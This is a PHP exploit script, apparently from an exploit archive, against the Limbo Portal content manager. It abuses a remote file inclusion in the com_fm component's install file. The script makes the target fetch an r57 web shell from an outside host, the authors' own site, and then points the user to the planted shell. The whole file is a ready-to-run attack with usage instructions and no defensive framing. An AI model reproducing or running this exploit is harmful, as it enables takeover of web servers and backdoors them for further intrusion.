#!/usr/bin/php -q -d short_open_tag=on
&lt;?
/*
/*   Limbo Portal Multiple vulnerabilities
/*  This exploit should Create a PHP shell
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r(&#039;
/**********************************************/
/* Limbo Portal Creat PHP shell exploit       */
/* by HACKERS PAL &lt;security@soqor.net&gt;        */
/* site: http://www.soqor.net                 */&#039;);
if ($argc&lt;2) {
print_r(&#039;
/* --                                         */
/* Usage: php &#039;.$argv[0].&#039; host
/* Example:                                   */
/*    php &#039;.$argv[0].&#039; http://localhost/
/**********************************************/
&#039;);
die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);

$url=$argv[1];
$exploit=&quot;components/com_fm/fm.install.php?lm_absolute_path=../../&amp;install_dir=http://www.soqor.net/tools/r57.txt?&quot;;
$page=$url.$exploit;
         Function get_page($url)
         {

                  if(function_exists(&quot;file_get_contents&quot;))
                  {

                       $contents = file_get_contents($url);

                          }
                          else
                          {
                              $fp=fopen(&quot;$url&quot;,&quot;r&quot;);
                              while($line=fread($fp,1024))
                              {
                               $contents=$contents.$line;
                              }


                                  }
                       return $contents;
         }

     $page = get_page($page);

     if(!eregi(&quot;Warning&quot;,$page))
     {
       Die(&quot;\n[+] Exploit Finished\n[+] Go To : &quot;.$url.&quot;admin/components/com_fm/lang/fm.english.php\n[+] You Got Your Own
PHP Shell\n/* Visit us : WwW.SoQoR.NeT                   */\n/**********************************************/&quot;);
             }
             Else
             {
                Die(&quot;\n[-] Exploit Failed\n/* Visit us : WwW.SoQoR.NeT
*/\n/**********************************************/&quot;);
                }
?&gt;
